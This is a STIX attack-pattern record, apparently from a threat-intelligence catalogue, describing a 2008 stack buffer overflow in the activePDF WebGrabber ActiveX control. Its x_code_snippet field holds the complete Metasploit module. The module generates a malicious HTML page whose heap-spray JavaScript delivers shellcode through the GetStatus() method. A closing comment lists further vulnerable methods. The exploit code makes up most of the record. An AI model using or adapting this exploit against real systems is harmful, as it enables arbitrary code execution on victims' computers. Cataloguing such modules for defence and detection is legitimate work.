{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f8b2e142-1a20-4987-9187-55601279cbf4",
    "created": "2024-08-14T16:36:47.398424Z",
    "modified": "2024-08-14T16:36:47.398428Z",
    "name": "activePDF WebGrabber ActiveX Control Buffer Overflow",
    "description": " This module exploits a stack buffer overflow in activePDF WebGrabber 3.8. When sending an overly long string to the GetStatus() method of APWebGrb.ocx (3.8.2.0) an attacker may be able to execute arbitrary code. This control is not marked safe for scripting, so choose your attack vector accordingly.   'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/fileformat/activepdf_webgrabber.rb",
            "external_id": "activepdf_webgrabber.rb"
        },
        {
            "source_name": "reference",
            "url": "http://www.activepdf.com/products/serverproducts/webgrabber/"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = LowRanking\n\n  include Msf::Exploit::FILEFORMAT\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'activePDF WebGrabber ActiveX Control Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a stack buffer overflow in activePDF WebGrabber 3.8. When\n        sending an overly long string to the GetStatus() method of APWebGrb.ocx (3.8.2.0)\n        an attacker may be able to execute arbitrary code. This control is not marked safe\n        for scripting, so choose your attack vector accordingly.\n\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         => [ 'MC' ],\n      'References'     =>\n        [\n          [ 'OSVDB', '64579'],\n          [ 'URL', 'http://www.activepdf.com/products/serverproducts/webgrabber/' ],\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'DisablePayloadHandler' => true\n        },\n      'Payload'        =>\n        {\n          'Space'         => 1024,\n          'BadChars'      => \"\\x00\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP0-SP3 / Windows Vista / IE 6.0 SP0-SP2 / IE 7', { 'Ret' => 0x0A0A0A0A } ]\n        ],\n      'DisclosureDate' => '2008-08-26',\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptString.new('FILENAME', [ false, 'The file name.',  'msf.html']),\n      ])\n  end\n\n  def exploit\n    # Encode the shellcode.\n    shellcode = Rex::Text.to_unescape(payload.encoded, Rex::Arch.endian(target.arch))\n\n    # Create some nops.\n    nops    = Rex::Text.to_unescape(make_nops(4))\n\n    # Set the return.\n    ret     = Rex::Text.uri_encode([target.ret].pack('L'))\n\n    # Randomize the javascript variable names.\n    vname  = rand_text_alpha(rand(100) + 1)\n    var_i  = rand_text_alpha(rand(30)  + 2)\n    rand1  = rand_text_alpha(rand(100) + 1)\n    rand2  = rand_text_alpha(rand(100) + 1)\n    rand3  = rand_text_alpha(rand(100) + 1)\n    rand4  = rand_text_alpha(rand(100) + 1)\n    rand5  = rand_text_alpha(rand(100) + 1)\n    rand6  = rand_text_alpha(rand(100) + 1)\n    rand7  = rand_text_alpha(rand(100) + 1)\n    rand8  = rand_text_alpha(rand(100) + 1)\n\n    content = %Q|<html>\n<head>\n<script>\ntry {\n  var #{vname} = new ActiveXObject('APWebGrabber.Object');\n  var #{rand1} = unescape('#{shellcode}');\n  var #{rand2} = unescape('#{nops}');\n  var #{rand3} = 20;\n  var #{rand4} = #{rand3} + #{rand1}.length;\n  while (#{rand2}.length < #{rand4}) #{rand2} += #{rand2};\n  var #{rand5} = #{rand2}.substring(0,#{rand4});\n  var #{rand6} = #{rand2}.substring(0,#{rand2}.length - #{rand4});\n  while (#{rand6}.length + #{rand4} < 0x40000) #{rand6} = #{rand6} + #{rand6} + #{rand5};\n  var #{rand7} = new Array();\n  for (#{var_i} = 0; #{var_i} < 400; #{var_i}++){ #{rand7}[#{var_i}] = #{rand6} + #{rand1} }\n  var #{rand8} = \"\";\n  for (#{var_i} = 0; #{var_i} < 800; #{var_i}++) { #{rand8} = #{rand8} + unescape('#{ret}') }\n  #{vname}.GetStatus(#{rand8},1);\n} catch( e ) { window.location = 'about:blank' ; }\n</script>\n</head>\n</html>\n|\n\n    content = Rex::Text.randomize_space(content)\n\n    print_status(\"Creating '#{datastore['FILENAME']}' file ...\")\n\n    file_create(content)\n  end\nend\n\n=begin\n\nOther methods that are vulnerable.\n\n[id(0x00000050), helpstring(\"Clean up after a WWWPrint call.\")]\nvoid CleanUp(BSTR ServerIPAddress, long ServerPort);\n\n[id(0x00000055)]\nBSTR Wait(BSTR IPAddress, long PortNumber, short WaitTime, BSTR AcceptedCommands);\n\n...and probably more.\n=end\n",
    "x_mitre_disclosure_date": "2008-08-26",
    "x_mitre_platforms": [
        "win'"
    ]
}